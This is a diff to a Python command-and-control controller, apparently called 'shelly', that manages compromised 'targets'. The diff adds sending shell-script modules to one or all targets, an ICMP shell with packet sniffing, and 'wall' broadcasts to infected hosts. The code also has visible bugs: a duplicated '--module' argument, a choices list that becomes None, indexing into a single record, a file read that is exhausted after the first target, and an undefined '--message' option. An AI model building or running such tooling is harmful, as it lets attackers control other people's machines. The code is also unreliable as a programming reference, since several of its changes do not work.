@@ -47,11 +47,13 @@ class Controller(Host):
         headers = ['name', 'description']
         data = []
         for module in os.listdir('./modules'):
-            with open(f"./modules/{module}","r") as file:
-                for line in file.readlines():
-                    if line.startswith("# DESCRIPTION:"):
-                        desc = (line[14:]).strip()
-            data.append([module.split('.')[0], desc])
+            if ".sh" in module:
+                with open(f"./modules/{module}","r") as file:
+                    desc = "Placeholder description. Please add a '# DESCRIPTION: {text}' tag."
+                    for line in file.readlines():
+                        if line.startswith("# DESCRIPTION:"):
+                            desc = (line[14:]).strip()
+                data.append([module.split('.')[0], desc])
         if len(data) != 0:
             response += columnar(data, headers, no_borders=True)
         else:
@@ -77,12 +79,19 @@ class Controller(Host):
             return True
         return False
 
-    def interact(self, target):
+    def get_targets(self, target):
+        if target == "all":
+            return self.db.all()
+        
         Target = Query()
         target = self.db.search(Target.number == target)[0]
         if target['status'] == "DISCONNECTED":
             print("This target is not connected")
-            return
+            return None
+        return target
+    
+    def interact(self, target):
+        target = self.get_targets(target)[0]
 
         sniffer = Process(target=self.sniffing, args=(target['ip'],))
         sniffer.start()
@@ -113,15 +122,13 @@ class Controller(Host):
             shell_lock.value = False
 
     def run(self, target, module):
-        Target = Query()
-        target = self.db.search(Target.number == target)[0]
-        if target['status'] == "DISCONNECTED":
-            print("This target is not connected")
-            return
+        targets = self.get_targets(target)
         
         try:
             with open(f"./modules/{module}.sh","r") as f:
-                self.send(target['ip'], "module", f.read().encode())
+                for target in targets:
+                    self.send(target['ip'], "module", f.read().encode())
+                    print(f"Module sent to {target['ip']}")
         except FileNotFoundError:
             print("Module does not exist")
 
@@ -135,6 +142,15 @@ class Controller(Host):
                 sniffer.kill()
                 break
 
+    def broadcast(self, target, message):
+        targets = self.get_targets(target)
+
+        message = f"wall {message}"
+
+        for target in targets:
+            self.send(target['ip'], 'instruction', message.encode())
+            print(f"Broadcasted to {target['ip']}")
+
 def main():
     controller = Controller()
     parser = ArgumentParser(
@@ -145,17 +161,18 @@ def main():
         'rm': '\tRemove a target',
         'interact': 'Interact with a specified target using the ICMP shell',
         'run': '\tRuns an included module against a specified target or all targets',
-        'broadcast': 'Broadcasts a message to all users on all targets',
+        'broadcast': 'Broadcasts a message to all users on a target',
         })
 
     module_names = [module.split(".")[0] for module in os.listdir('./modules')]
 
     parser.add_argument('-t', '--target', choices=[str(target['id']) for target in controller.db.all()].append("all"), help='The target to interact with/run modules on. Specifying \'all\' will select ALL targets.')  
     parser.add_argument('-m', '--module', choices=module_names, help='The module to use for the run command')  
+    parser.add_argument('-m', '--module', choices=module_names, help='The module to use for the run command')  
 
     args = parser.parse_args()
 
-    if args.command in ('interact', 'run', 'rm') and (args.target is None):
+    if args.command in ('interact', 'run', 'rm', 'broadcast') and (args.target is None):
         parser.error(f"The command {args.command} requires you to set a target with --target")
 
     match args.command:
@@ -172,7 +189,9 @@ def main():
                 parser.error(f"The command {args.command} requires you to declare a module\nModules can be found by running shelly.py ls")
             controller.run(int(args.target), args.module)
         case "broadcast":
-            print("Broadcast")
+            if args.message is None:
+                parser.error(f"The command {args.command} requires you to declare a message")
+            controller.broadcast(int(args.target), args.message)
 
 if __name__ == "__main__":
     main()
